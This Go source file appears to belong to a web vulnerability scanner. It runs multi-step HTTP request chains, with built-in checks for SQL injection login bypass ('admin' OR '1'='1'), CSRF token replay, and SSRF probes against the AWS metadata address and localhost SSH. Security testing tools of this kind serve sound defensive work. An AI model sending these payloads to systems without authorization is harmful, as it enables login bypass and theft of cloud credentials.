package engine

import (
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
)

type ChainStep struct {
	Name        string
	Method      string
	URL         string
	Headers     map[string]string
	Body        string
	Extract     []Extractor
	OnMatch     []string
	OnFail      []string
	MatchWords  []string
	MatchStatus []int
}

type Extractor struct {
	Name    string
	Type    string
	Pattern string
	Group   int
}

type Chain struct {
	Name  string
	Steps map[string]*ChainStep
	Vars  map[string]string
}

func NewChain(name string) *Chain {
	return &Chain{
		Name:  name,
		Steps: make(map[string]*ChainStep),
		Vars:  make(map[string]string),
	}
}

func (c *Chain) AddStep(s ChainStep) {
	c.Steps[s.Name] = &s
}

func (c *Chain) Run(client *http.Client, cfg *core.Config, startStep string) []core.ScanResult {
	var results []core.ScanResult
	vars := make(map[string]string)
	for k, v := range c.Vars {
		vars[k] = v
	}
	c.runStep(client, cfg, startStep, &results, make(map[string]int), vars)
	return results
}

func (c *Chain) runStep(client *http.Client, cfg *core.Config, name string, results *[]core.ScanResult, visits map[string]int, vars map[string]string) {
	if visits[name] >= 10 {
		return
	}
	visits[name]++

	step, ok := c.Steps[name]
	if !ok {
		return
	}

	reqURL := c.expandVars(step.URL, vars)
	reqBody := c.expandVars(step.Body, vars)

	req, err := http.NewRequest(step.Method, reqURL, strings.NewReader(reqBody))
	if err != nil {
		return
	}
	core.ApplyHeaders(req, cfg)
	for k, v := range step.Headers {
		req.Header.Set(k, c.expandVars(v, vars))
	}

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	body := core.ReadBody(resp.Body)
	resp.Body.Close()

	for _, ext := range step.Extract {
		val := extractValue(ext, body, resp)
		if val != "" {
			vars[ext.Name] = val
			if cfg.Verbose {
				output.Verbose("[chain] %s: extracted %s = %q", c.Name, ext.Name, val[:min(40, len(val))])
			}
		}
	}

	matched := c.checkMatch(step, body, resp)

	if matched {
		if len(step.MatchWords) > 0 || len(step.MatchStatus) > 0 {
			*results = append(*results, core.ScanResult{
				Type:      fmt.Sprintf("Chain: %s → %s", c.Name, step.Name),
				URL:       reqURL,
				Method:    step.Method,
				Parameter: "chain",
				Payload:   c.Name,
				Severity:  "HIGH",
				Evidence:  fmt.Sprintf("Step %q in chain %q matched — multi-step attack confirmed", step.Name, c.Name),
				Timestamp: time.Now(),
			})
			output.VulnInline("CHAIN", "%s → %s matched", c.Name, step.Name)
		}
		for _, next := range step.OnMatch {
			c.runStep(client, cfg, next, results, visits, vars)
		}
	} else {
		for _, next := range step.OnFail {
			c.runStep(client, cfg, next, results, visits, vars)
		}
	}
}

func (c *Chain) expandVars(s string, vars map[string]string) string {
	for k, v := range vars {
		s = strings.ReplaceAll(s, "{{"+k+"}}", v)
	}
	return s
}

func (c *Chain) checkMatch(s *ChainStep, body string, resp *http.Response) bool {
	statusOK := len(s.MatchStatus) == 0
	for _, expected := range s.MatchStatus {
		if resp.StatusCode == expected {
			statusOK = true
			break
		}
	}
	wordsOK := len(s.MatchWords) == 0
	for _, w := range s.MatchWords {
		if strings.Contains(strings.ToLower(body), strings.ToLower(w)) {
			wordsOK = true
			break
		}
	}
	return statusOK && wordsOK
}

func extractValue(ext Extractor, body string, resp *http.Response) string {
	switch ext.Type {
	case "regex":
		re, err := regexp.Compile(ext.Pattern)
		if err != nil {
			return ""
		}
		m := re.FindStringSubmatch(body)
		group := ext.Group
		if group == 0 {
			group = 1
		}
		if len(m) > group {
			return m[group]
		}
	case "header":
		return resp.Header.Get(ext.Pattern)
	case "cookie":
		for _, c := range resp.Cookies() {
			if c.Name == ext.Pattern {
				return c.Value
			}
		}
	case "json":
		pat := fmt.Sprintf(`"%s"\s*:\s*"([^"]+)"`, regexp.QuoteMeta(ext.Pattern))
		re, err := regexp.Compile(pat)
		if err != nil {
			return ""
		}
		m := re.FindStringSubmatch(body)
		if len(m) > 1 {
			return m[1]
		}
	}
	return ""
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func ChainLoginBypass(client *http.Client, cfg *core.Config, loginURL string) []core.ScanResult {
	chain := NewChain("LoginBypass")
	chain.AddStep(ChainStep{
		Name:    "get_form",
		Method:  "GET",
		URL:     loginURL,
		Extract: []Extractor{{Name: "csrf", Type: "regex", Pattern: `name="csrf[^"]*"\s+value="([^"]+)"`}},
		OnMatch: []string{"inject_sqli"},
	})
	chain.AddStep(ChainStep{
		Name:        "inject_sqli",
		Method:      "POST",
		URL:         loginURL,
		Headers:     map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
		Body:        "user=admin' OR '1'='1&pass=test&csrf={{csrf}}",
		MatchWords:  []string{"welcome", "dashboard", "logout", "admin"},
		MatchStatus: []int{200, 302},
	})
	return chain.Run(client, cfg, "get_form")
}

func ChainCSRFExploit(client *http.Client, cfg *core.Config, formURL string) []core.ScanResult {
	chain := NewChain("CSRFExploit")
	chain.AddStep(ChainStep{
		Name:    "extract_token",
		Method:  "GET",
		URL:     formURL,
		Extract: []Extractor{{Name: "csrf", Type: "regex", Pattern: `name="_token"\s+value="([^"]+)"`}},
		OnMatch: []string{"replay_without_token"},
	})
	chain.AddStep(ChainStep{
		Name:       "replay_without_token",
		Method:     "POST",
		URL:        formURL,
		Headers:    map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
		Body:       "name=test&email=test@test.com&_token=INVALID",
		MatchWords: []string{"success", "saved", "updated"},
	})
	return chain.Run(client, cfg, "extract_token")
}

func ChainSSRFProbe(client *http.Client, cfg *core.Config, baseURL string, param string) []core.ScanResult {
	parsed, err := url.Parse(baseURL)
	if err != nil || parsed == nil {
		return nil
	}
	chain := NewChain("SSRFProbe")
	chain.Vars["base"] = fmt.Sprintf("%s://%s", parsed.Scheme, parsed.Host)
	chain.Vars["param"] = param

	chain.AddStep(ChainStep{
		Name:       "probe_aws",
		Method:     "GET",
		URL:        "{{base}}?{{param}}=http://169.254.169.254/latest/meta-data/",
		MatchWords: []string{"ami-id", "instance-id", "security-credentials"},
		OnFail:     []string{"probe_localhost"},
	})
	chain.AddStep(ChainStep{
		Name:       "probe_localhost",
		Method:     "GET",
		URL:        "{{base}}?{{param}}=http://127.0.0.1:22/",
		MatchWords: []string{"SSH", "OpenSSH", "protocol mismatch"},
	})
	return chain.Run(client, cfg, "probe_aws")
}
